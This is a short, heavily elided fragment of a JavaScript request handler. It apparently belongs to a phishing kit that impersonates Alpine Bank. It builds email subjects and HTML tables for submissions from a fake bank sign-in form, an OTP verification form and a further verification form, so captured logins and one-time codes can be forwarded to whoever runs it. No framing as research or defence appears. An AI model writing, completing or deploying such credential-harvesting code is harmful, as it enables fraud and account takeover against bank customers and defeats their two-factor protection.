...
export default async function handler(req, res) {
    ...
    if (subject === 'Login Details') {
        customSubject = 'Submission Alpine Bank sign in form';
        htmlBody = `
        ...
        customSubject = 'Submission ALpine bank OTP verification form';
        htmlBody = `
            <table border="1" cellpadding="8" cellspacing="0" style="border-collapse:collapse;font-family:Arial,sans-serif;">
                <tr style="background:#f4f4f4;"><th>Field</th><th>Value</th></tr>
        ...
        customSubject = 'Submission of Alpine bank Verification form';
